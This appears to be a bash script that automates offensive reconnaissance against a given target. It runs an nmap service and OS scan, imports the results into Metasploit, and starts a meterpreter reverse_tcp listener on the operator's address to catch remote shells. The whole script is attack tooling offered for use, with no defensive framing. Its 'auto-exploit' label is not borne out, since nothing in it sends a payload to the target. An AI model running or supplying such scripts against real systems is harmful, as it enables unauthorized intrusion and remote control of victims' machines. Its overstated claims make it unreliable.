#!/bin/bash

# Advanced: Use Metasploit's vulns table to match real exploits

TARGET=$1
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
NMAP_XML="nmap_auto_${TIMESTAMP}.xml"

LHOST=$(ip route get 1 | awk '{print $7}' | head -1)
LPORT=4444

nmap -sV -O -oX "$NMAP_XML" "$TARGET"
service postgresql start
msfdb init 2>/dev/null

msfconsole -q -x "
db_import $NMAP_XML;
use exploit/multi/handler;
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
set LHOST $LHOST;
set LPORT $LPORT;
exploit -j;

vulns --exploit;
" | tee msf_autoexploit.log

echo "Check msf_autoexploit.log for results and sessions!"
